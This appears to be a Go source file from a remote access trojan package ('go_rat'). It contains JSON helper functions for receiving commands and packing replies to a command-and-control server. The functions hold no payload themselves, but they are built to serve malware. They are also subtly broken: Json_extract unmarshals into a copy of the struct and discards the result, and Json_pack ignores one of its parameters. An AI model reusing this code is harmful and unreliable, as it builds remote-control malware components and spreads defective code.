/*/
This file contains the functions necessary for input and output
from files, networks, software, etc...

/*/
package go_rat

import (
	"encoding/json"
)

//
// This function of for extracting messages sent in json into the
// Command type
// This gets placed in a loop to handle net.Conn type
// containing json AFTER AUTH
func Json_extract(text string, command_struct Command) {
	/*/
		use Unmarshal if we expect our data to be pure JSON
		second parameter is the address of the struct
		we want to store our arsed data in
	/*/

	json.Unmarshal([]byte(text), &command_struct)
}

/*/
Function for packing up a string to send down the wire to the command and control
/*/
func Json_pack(json_string string, outgoing_message OutgoingMessage) []byte {
	encoded_json, err := json.Marshal(json_string)
	if err != nil {
		Error_printer(err, "[-] Problem with JSON packing function")
	}
	return encoded_json
}
